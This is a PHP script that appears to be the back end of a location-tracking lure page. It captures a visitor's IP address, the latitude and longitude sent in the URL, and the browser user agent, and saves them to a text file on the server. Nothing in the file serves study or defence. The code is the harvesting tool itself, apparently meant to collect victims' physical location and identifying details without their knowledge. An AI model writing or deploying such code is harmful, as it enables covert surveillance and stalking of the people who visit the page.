<?php
if (!isset($_SESSION['kill'])){
    header("Location: /index.php");
}
function getUserIP()
  {
    // Get real visitor IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
}
$ipp = getUserIP();
$lat = $_GET["lat"];
$lon = $_GET["lon"];
$ua = $_SERVER["HTTP_USER_AGENT"];
$j = array(
    "ip" => $ipp,
    "lat" => $lat,
    "lon" => $lon,
    "ua" => $ua
);
$d=fopen("json_info.txt","w");
fwrite($d,json_encode($j));
fclose($d);
session_start();
$_SESSION['kill'] = '';
unset($_SESSION['kill']);
session_unset();
session_destroy();
exit();
?>

